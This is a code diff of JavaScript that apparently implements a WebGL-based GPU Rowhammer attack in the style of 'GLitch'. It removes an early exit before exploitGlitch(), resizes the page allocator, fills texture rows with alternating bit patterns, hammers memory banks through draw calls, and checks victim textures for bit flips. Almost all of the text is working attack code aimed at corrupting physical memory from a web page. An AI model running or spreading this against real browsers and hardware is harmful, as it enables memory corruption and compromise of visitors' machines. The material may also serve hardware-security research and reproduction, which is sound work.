@@ -6,14 +6,12 @@ async function glitch() {
     // create gl context
     initGL();
     initFramebuffer();
-    await exploitGlitch();
-    return;
     
     allocatePages(PAGES_PER_MB * 32);
-    const allocator = new Allocator(PAGES_PER_MB * 192);
+    const allocator = new Allocator(PAGES_PER_MB * 164);
     await allocator._init(0);
     const contPages = allocator.SearchContPages();
-    // const contPages = mockContPages(5)
+    // const contPages = mockContPages(10)
 
     console.log(`++ ${contPages.length} continuous pages found`);
     
@@ -21,10 +19,12 @@ async function glitch() {
     shader = new Shader('vertex-shader', 'fragment-shader');
     shader.use();
 
+    // initDebug();
+
     let hammered = 0;
     for (let cont of contPages) {
         console.log(`++ Starting Hammering ContBlock ${hammered}`)
-        hammerTime(cont);
+        await hammerTime(cont);
         hammered += 1;
     }
 
@@ -34,7 +34,7 @@ async function glitch() {
     // viewFramebuffer();
 }
 
-function hammerTime(contMem) {
+async function hammerTime(contMem) {
     // example for hammering first bank x=hammer, .=eviction
     //  0001 0203 0405 0607 0809 1011 1213 1415
     // |xxxx|----|----|----|----|----|----|----|
@@ -45,16 +45,11 @@ function hammerTime(contMem) {
     //  4849 5051 5253 5455 5657 5859 6061 6263
     // |----|----|----|----|----|--..|....|....|
 
-    // hammer row 0 and row 1
-    for (let row = 0; row <= 16; row += 16) {
-        console.log(`++ Prepare row [${row/16}] for hammer.`);
 
-        // hammer every bank in a row
+    // fill textures for hammering
+    for (let row = 0; row < 16; row += 16) {
         for (let localOffset = 0; localOffset < 16; localOffset += 2) {
             let offset = row + localOffset;
-            // console.log(`+++ Prepare bank [${offset}] [${offset + 1}]`);
-
-
             // fill textures in row n-1, n+1 with 0
             // TODO: only necessary when hammering row 1
             fillTexture(contMem[offset + 0].texture, 0x00);
@@ -62,11 +57,32 @@ function hammerTime(contMem) {
 
             fillTexture(contMem[offset + 32].texture, 0x00);
             fillTexture(contMem[offset + 33].texture, 0x00);
+            console.log(`++ Filled textures with 0 [${offset + 0}] [${offset + 1}] [${offset + 32}] [${offset + 33}]`);
 
             // fill textures in row n with 1
             fillTexture(contMem[offset + 16].texture, 0xFF);
             fillTexture(contMem[offset + 17].texture, 0xFF);
+            console.log(`++ Filled textures with 1 [${offset + 16}] [${offset + 17}]`);
+        }
+    }
+
+    // WebGL2 has some strange asynchronous behaviour
+    await sleep(500);
+
+    // hammer row 0 and row 1
+    // TODO: also execute for row 1 (<=16)
+    for (let row = 0; row < 16; row += 16) {
+        // console.log(`++ Prepare row [${row/16}] for hammer.`);
+
+        // hammer every bank in a row
+        for (let localOffset = 0; localOffset < 16; localOffset += 2) {
+            let offset = row + localOffset;
+            console.log(`+++ Prepare bank [${offset}] [${offset + 1}]`);
             
+            // Uniforms as debug tool
+            shader.setInt('bank0', offset);
+            shader.setInt('bank1', offset + 1);
+
             // pass hammer textures according to hammer pattern: jump to differnet row to trigger row buffer when hammering
             shader.bindTexture(contMem[offset + 0].texture, 0, 'H', offset + 0);
             shader.bindTexture(contMem[offset + 32].texture, 2, 'H', offset + 32);
@@ -101,13 +117,17 @@ function hammerTime(contMem) {
             }
 
             // hammer textures
-            // console.log(`+++ Hammering bank [${offset}] [${offset + 1}]`);
+            console.log(`+++ Hammering bank [${offset}] [${offset + 1}]`);
             gl.drawArrays(gl.POINTS, 0, 1);
-            // console.log(`+++ Hammering bank [${offset}] [${offset + 1}] done`);
+            console.log(`+++ Hammering bank [${offset}] [${offset + 1}] done`);
+            // Debug with framebuffer - initDebug needs to be called before
+            // gl.drawArrays(gl.TRIANGLES, 0, 6);
+            // viewFramebuffer();
 
-            // check hammered textures for bit flip
-            // checkForFlip(contMem[offset + 16].texture, offset+16);
-            // checkForFlip(contMem[offset + 17].texture, offset+17);
+            await sleep(100); // flushes console log
+            checkForFlip(contMem[offset + 16].texture);
+            checkForFlip(contMem[offset + 17].texture);
+            console.log(`++ Checked [${offset + 16}] [${offset + 17}] for bitflips.`);
         }
 
     }
